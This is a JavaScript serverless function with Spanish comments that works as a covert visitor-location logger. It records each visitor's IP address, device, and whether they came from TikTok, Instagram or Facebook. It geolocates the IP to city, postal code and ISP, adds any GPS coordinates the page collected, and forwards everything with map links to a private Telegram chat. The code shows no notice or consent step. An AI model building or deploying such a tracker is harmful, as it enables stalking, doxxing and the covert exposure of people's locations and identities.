exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const body = JSON.parse(event.body || '{}');
    const headers = event.headers;

    const ip =
      headers['x-nf-client-connection-ip'] ||
      headers['x-forwarded-for']?.split(',')[0].trim() ||
      headers['client-ip'] ||
      'unknown';

    const userAgent = headers['user-agent'] || 'unknown';
    const timestamp = new Date().toISOString();

    const {
      denied, reason,
      latitude, longitude, accuracy,
      altitude, altitudeAccuracy, heading, speed,
    } = body;

    // ── Geolocalización por IP ──────────────────────────────────────────────
    let ipGeo = null;
    if (ip !== 'unknown' && ip !== '::1') {
      try {
        const geoRes = await fetch(`https://ipwho.is/${ip}`);
        const geoData = await geoRes.json();
        if (geoData.success) {
          ipGeo = {
            ciudad:        geoData.city,
            region:        geoData.region,
            pais:          geoData.country,
            pais_codigo:   geoData.country_code,
            latitud:       geoData.latitude,
            longitud:      geoData.longitude,
            codigo_postal: geoData.postal,
            isp:           geoData.connection?.isp,
            org:           geoData.connection?.org,
          };
        }
      } catch (e) {
        console.warn('IP geo fallida:', e.message);
      }
    }

    // ── Detectar dispositivo/app desde User-Agent ───────────────────────────
    const ua = userAgent.toLowerCase();
    const device =
      ua.includes('iphone') ? '📱 iPhone' :
      ua.includes('ipad')   ? '📱 iPad'   :
      ua.includes('android') ? '📱 Android' :
      ua.includes('windows') ? '💻 Windows' :
      ua.includes('mac')     ? '💻 Mac'     : '🖥️ Otro';

    const app =
      ua.includes('musical_ly') || ua.includes('tiktok') ? 'TikTok' :
      ua.includes('instagram')  ? 'Instagram' :
      ua.includes('fban') || ua.includes('fbav') ? 'Facebook' :
      'Navegador';

    // ── Mensaje Telegram ────────────────────────────────────────────────────
    const gpsLine = denied
      ? `🛰️ GPS: Denegado (${reason || 'sin razón'})`
      : `🛰️ GPS: ${latitude?.toFixed(5)}, ${longitude?.toFixed(5)} (±${Math.round(accuracy)}m)`;

    const ipGeoLine = ipGeo
      ? `📌 IP Geo: ${ipGeo.ciudad}, ${ipGeo.region} (${ipGeo.latitud?.toFixed(4)}, ${ipGeo.longitud?.toFixed(4)})\n🌍 País: ${ipGeo.pais} | CP: ${ipGeo.codigo_postal}\n📡 ISP: ${ipGeo.isp}`
      : `📌 IP Geo: no disponible`;

    const mapsLink = ipGeo
      ? `\n🗺️ Ver en mapa: https://maps.google.com/?q=${ipGeo.latitud},${ipGeo.longitud}`
      : '';

    const gpsMapLink = !denied && latitude
      ? `\n📍 GPS exacto: https://maps.google.com/?q=${latitude},${longitude}`
      : '';

    const text = [
      `🔔 *Nueva visita*`,
      `🕐 ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}`,
      `🌐 IP: \`${ip}\``,
      ipGeoLine,
      gpsLine,
      `${device} · ${app}`,
      mapsLink,
      gpsMapLink,
    ].filter(Boolean).join('\n');

    // ── Enviar a Telegram ───────────────────────────────────────────────────
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT  = process.env.TELEGRAM_CHAT_ID;

    if (TELEGRAM_TOKEN && TELEGRAM_CHAT) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id:    TELEGRAM_CHAT,
          text,
          parse_mode: 'Markdown',
        }),
      });
    }

    console.log('VISIT:', JSON.stringify({ timestamp, ip, ipGeo, gps: { denied, latitude, longitude, accuracy } }));

    return {
      statusCode: 200,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ success: true }),
    };
  } catch (err) {
    console.error('Error:', err.message);
    return { statusCode: 500, body: JSON.stringify({ success: false }) };
  }
};
